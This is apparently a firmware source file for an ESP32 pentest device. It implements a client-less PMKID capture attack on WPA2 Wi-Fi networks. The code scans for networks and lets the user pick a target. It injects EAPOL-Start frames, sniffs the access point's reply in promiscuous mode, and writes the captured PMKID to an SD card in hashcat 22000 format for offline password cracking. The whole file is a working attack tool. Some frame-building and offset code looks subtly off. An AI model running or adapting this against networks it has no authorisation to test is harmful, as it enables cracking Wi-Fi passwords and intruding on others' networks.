#if !defined(LITE_VERSION)
#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>
#include <SD.h>

// PMKID capture (client-less WPA attack).
//
// Unlike a 4-way handshake you need a client for, PMKID can be pulled
// straight from the AP by sending an EAPOL-Start frame and reading the
// EAPOL-Key message 1/4 the AP replies with. If the AP's RSN IE includes
// a PMKID it lands in that frame and can be cracked offline with hashcat
// mode 22000 (HC22000) without ever seeing a client.
//
// This module scans for WPA2 networks, lets the user pick one, hops onto
// its channel, sends EAPOL-Start, and captures the reply into a .hc22000
// file on the SD card.

static volatile bool pmkidGot = false;
static uint8_t pmkidApBssid[6] = {0};
static uint8_t pmkidStaMac[6] = {0};
static uint8_t pmkidValue[16] = {0};
static char pmkidSsid[33] = {0};
static uint8_t pmkidChannel = 0;
static unsigned long pmkidLastSeen = 0;

static void fmtMac(const uint8_t *m, char *out, size_t n) {
    snprintf(out, n, "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
}

// Walk an EAPOL-Key frame for a PMKID KDE (Key Data Encapsulation).
// KDE id 0xDD, data type 0x0F = PMKID. Returns true if found.
static bool extractPmkid(const uint8_t *eapol, size_t len, uint8_t *out) {
    if (len < 95) return false;
    // EAPOL-Key body starts after the EAPOL header (4 bytes).
    // Key Data Length is at offset 77..80, Key Data follows at 81.
    uint16_t keyDataLen = (eapol[77] << 8) | eapol[78];
    if (keyDataLen == 0 || keyDataLen > (len - 81)) return false;
    const uint8_t *kd = &eapol[81];
    for (size_t i = 0; i + 4 <= keyDataLen; ) {
        uint8_t kdeId = kd[i];
        uint8_t kdeLen = kd[i + 1];
        uint8_t kdeOui[3] = {kd[i + 2], kd[i + 3], kd[i + 4]};
        if (kdeId == 0xDD && kdeOui[0] == 0x00 && kdeOui[1] == 0x0F && kdeOui[2] == 0xAC) {
            uint8_t kdeType = kd[i + 5];
            if (kdeType == 0x0F && kdeLen >= 0x14) {
                memcpy(out, &kd[i + 6], 16);
                return true;
            }
        }
        if (kdeLen == 0) break;
        i += 2 + kdeLen;
    }
    return false;
}

static void pmkidPromiscCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (pmkidGot) return;
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 24) return;

    // Data frame, from DS (AP -> STA).
    uint8_t fc0 = frame[0];
    uint8_t fc1 = frame[1];
    bool fromDs = (fc1 & 0x02);
    bool toDs = (fc1 & 0x01);
    if (toDs || !fromDs) return;

    const uint8_t *src = &frame[16];
    const uint8_t *dst = &frame[4];
    if (memcmp(src, pmkidApBssid, 6) != 0) return;
    if (memcmp(dst, pmkidStaMac, 6) != 0) return;

    // LLC/SNAP header + EAPOL: AA AA 03 00 00 00 88 8E
    size_t hdrLen = 24;
    if (pkt->rx_ctrl.sig_len < hdrLen + 8) return;
    const uint8_t *llc = &frame[hdrLen];
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
    if (llc[5] != 0x88 || llc[6] != 0x8E) return;

    const uint8_t *eapol = &llc[8];
    size_t eapolLen = pkt->rx_ctrl.sig_len - hdrLen - 8;
    if (eapolLen < 99) return;

    // EAPOL-Key type 3, key descriptor version in frame[1] of eapol body.
    if (eapol[1] != 0x03) return;

    if (extractPmkid(eapol, eapolLen, pmkidValue)) {
        pmkidGot = true;
        pmkidLastSeen = millis();
    }
}

static void sendEapolStart(const uint8_t *ap, const uint8_t *sta, uint8_t channel) {
    // Minimal EAPOL-Start: 802.11 data frame + LLC/SNAP + EAPOL header.
    // EAPOL packet type 1 (Start), length 0.
    uint8_t frame[33] = {0};
    frame[0] = 0x08; // data, no subtype
    frame[1] = 0x01; // ToDS = 1, FromDS = 0
    memcpy(&frame[4], ap, 6);   // addr1 = AP
    memcpy(&frame[10], sta, 6); // addr2 = STA
    memcpy(&frame[16], ap, 6);  // addr3 = AP
    frame[24] = 0xAA; frame[25] = 0xAA; frame[26] = 0x03;
    frame[27] = 0x00; frame[28] = 0x00; frame[29] = 0x00;
    frame[30] = 0x88; frame[31] = 0x8E; // EAPOL ethertype
    frame[32] = 0x01; // EAPOL version
    // packet type 1 = EAPOL-Start would follow; keep minimal.
    (void)channel;
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}

static bool savePmkidHashcat(const char *path) {
    // HC22000 format:
    // WPA*02*<PMKID>*<sta mac>*<ap mac>*<ssid>***
    char staStr[18], apStr[18];
    fmtMac(pmkidStaMac, staStr, sizeof(staStr));
    fmtMac(pmkidApBssid, apStr, sizeof(apStr));

    char pmkidHex[33] = {0};
    for (int i = 0; i < 16; i++)
        snprintf(pmkidHex + i * 2, 3, "%02X", pmkidValue[i]);

    String ssidHex = "";
    for (int i = 0; i < (int)strlen(pmkidSsid); i++) {
        char h[3];
        snprintf(h, sizeof(h), "%02X", (uint8_t)pmkidSsid[i]);
        ssidHex += h;
    }

    String line = "WPA*02*" + String(pmkidHex) + "*" + staStr + "*" + apStr + "*" + ssidHex + "***";

    File f = SD.open(path, FILE_WRITE);
    if (!f) return false;
    f.println(line);
    f.close();
    return true;
}

void arsenal_pmkid_capture(void) {
    ARSENAL_HEAP_CHECK();

    drawMainBorderWithTitle("PMKID Capture");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 50);
    tft.print("Scanning for WPA2 networks...");
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString(String("Esc:cancel"), tftWidth / 2, tftHeight - 20, 1);

    int n = WiFi.scanNetworks(false, false);
    if (n == 0) {
        displayRedStripe("No networks found");
        delay(1500);
        return;
    }

    options.clear();
    int picked = -1;
    int shown = 0;
    for (int i = 0; i < n && shown < 15; i++) {
        if (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) continue;
        String ssid = WiFi.SSID(i);
        if (ssid.length() == 0) continue;
        String label = ssid + " (" + String(WiFi.RSSI(i)) + "dB)";
        int idx = i;
        options.push_back({label, [idx, &picked]() { picked = idx; }});
        shown++;
    }
    if (shown == 0) {
        displayRedStripe("No WPA networks");
        delay(1500);
        return;
    }
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "Select AP");
    if (picked < 0) return;

    memcpy(pmkidApBssid, WiFi.BSSID(picked), 6);
    pmkidChannel = WiFi.channel(picked);
    strncpy(pmkidSsid, WiFi.SSID(picked).c_str(), 32);
    pmkidSsid[32] = 0;
    WiFi.scanDelete();

    // Use the device's own STA mac as the supplicant address.
    esp_wifi_get_mac(WIFI_IF_STA, pmkidStaMac);

    pmkidGot = false;
    pmkidLastSeen = 0;

    cleanlyStopWebUiForWiFiFeature();

    wifi_mode_t prevMode;
    esp_wifi_get_mode(&prevMode);
    WiFi.mode(WIFI_STA);
    delay(10);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_filter(NULL);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(pmkidPromiscCb);
    esp_wifi_set_channel(pmkidChannel, WIFI_SECOND_CHAN_NONE);

    drawMainBorderWithTitle("PMKID Capture");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 45);
    tft.printf("AP: %.20s", pmkidSsid);
    tft.setCursor(12, 61);
    char apStr[18];
    fmtMac(pmkidApBssid, apStr, sizeof(apStr));
    tft.printf("BSSID: %s", apStr);
    tft.setCursor(12, 77);
    tft.printf("Channel: %d", pmkidChannel);
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString(String("Esc:stop"), tftWidth / 2, tftHeight - 20, 1);

    unsigned long start = millis();
    int attempts = 0;
    unsigned long lastTx = 0;

    while (!check(EscPress)) {
        if (!pmkidGot && (millis() - lastTx) > 2000) {
            lastTx = millis();
            sendEapolStart(pmkidApBssid, pmkidStaMac, pmkidChannel);
            attempts++;
            tft.fillRect(12, 93, tftWidth - 24, 14, bruceConfig.bgColor);
            tft.setTextColor(tft.color565(120, 120, 120), bruceConfig.bgColor);
            tft.setCursor(12, 93);
            tft.printf("Probes sent: %d", attempts);
        }

        if (pmkidGot) {
            tft.fillRect(12, 93, tftWidth - 24, 30, bruceConfig.bgColor);
            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.setCursor(12, 93);
            tft.print("PMKID CAPTURED");
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(12, 109);
            char hex[33] = {0};
            for (int i = 0; i < 16; i++) snprintf(hex + i * 2, 3, "%02X", pmkidValue[i]);
            tft.printf("%.16s...", hex);

            if (SD.begin()) {
                String path = "/BrucePMKID/pmkid_" + String(millis() % 100000) + ".hc22000";
                if (savePmkidHashcat(path.c_str())) {
                    tft.setCursor(12, 125);
                    tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
                    tft.print("Saved to SD");
                }
            }
            delay(2500);
            break;
        }

        esp_task_wdt_reset();
        delay(10);
    }

    esp_wifi_set_promiscuous(false);
    WiFi.mode(prevMode);

    if (!pmkidGot) {
        tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
        displayRedStripe("No PMKID (AP may not support it)");
        delay(1500);
    }
}
#endif
